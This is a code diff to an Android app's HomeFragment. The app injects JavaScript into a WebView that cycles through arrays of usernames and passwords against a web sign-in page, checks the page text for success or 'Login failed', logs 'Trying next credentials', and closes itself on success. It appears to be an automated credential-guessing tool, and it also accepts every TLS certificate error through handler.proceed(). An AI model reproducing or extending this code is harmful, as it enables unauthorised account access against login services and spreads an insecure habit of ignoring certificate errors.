@@ -10,6 +10,7 @@ import android.view.ViewGroup;
 import android.webkit.JavascriptInterface;
 import android.webkit.SslErrorHandler;
 import android.webkit.WebChromeClient;
+import android.webkit.WebResourceRequest;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import androidx.annotation.NonNull;
@@ -58,6 +59,7 @@ public class HomeFragment extends Fragment {
                 passwordsJsArray.append(",");
             }
         }
+
         usernamesJsArray.append("]");
         passwordsJsArray.append("]");
 
@@ -87,6 +89,8 @@ public class HomeFragment extends Fragment {
                         "function checkLogin() {" +
                         "var successMessage = document.getElementById('signin-caption').innerText;" +
                         "var errorMessage = document.getElementById('statusmessage').innerText;" +
+                        "console.log('Success Message:', successMessage);" +
+                        "console.log('Error Message:', errorMessage);" +
                         "if (successMessage.includes('You are signed in as')) {" +
                         "Android.onLoginSuccess();" +
                         "} else if (errorMessage.includes('Login failed')) {" +
@@ -106,7 +110,38 @@ public class HomeFragment extends Fragment {
         @Override
         public void onPageFinished(WebView view, String url) {
             super.onPageFinished(view, url);
-            injectJavaScript(view);
+            // Inject JavaScript only if not redirected to Google
+            if (!url.equals("https://www.google.com")) {
+                injectJavaScript(view);
+            }
+            if (url.equals("https://www.google.com")) { // Replace with your success condition
+                closeApp();
+            }
+        }
+        private void closeApp() {
+            getActivity().runOnUiThread(new Runnable() {
+                @Override
+                public void run() {
+                    getActivity().finishAndRemoveTask(); // Finish the activity and remove it from recents
+                    System.exit(0); // Exit the app
+                }
+            });
+        }
+        @Override
+        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
+            String url = request.getUrl().toString();
+            if (url.equals("https://www.google/")) {
+                // Close the app when redirected to Google
+                getActivity().runOnUiThread(new Runnable() {
+                    @Override
+                    public void run() {
+                        getActivity().finishAffinity();
+                        System.exit(0); // Exit the app
+                    }
+                });
+                return true; // Indicate that the URL loading is handled
+            }
+            return false; // Allow the WebView to load the URL
         }
 
         @Override
@@ -114,16 +149,24 @@ public class HomeFragment extends Fragment {
             handler.proceed();
         }
     }
-
     public class WebAppInterface {
         @JavascriptInterface
         public void onLoginSuccess() {
-            Log.d("WebAppInterface", "Login successful!");
+            Log.d("WebAppInterface", "Login successful! Closing app.");
+            // Close the app completely
+            getActivity().runOnUiThread(new Runnable() {
+                @Override
+                public void run() {
+                    getActivity().finishAndRemoveTask(); // Finish the activity and remove it from recents
+                    System.exit(0); // Exit the app
+                }
+            });
         }
 
         @JavascriptInterface
         public void onLoginFailed() {
-            Log.d("WebAppInterface", "Login failed!");
+            Log.d("WebAppInterface", "Login failed! Trying next credentials.");
+            // Optionally, you can show a message or take other actions
         }
     }
 }
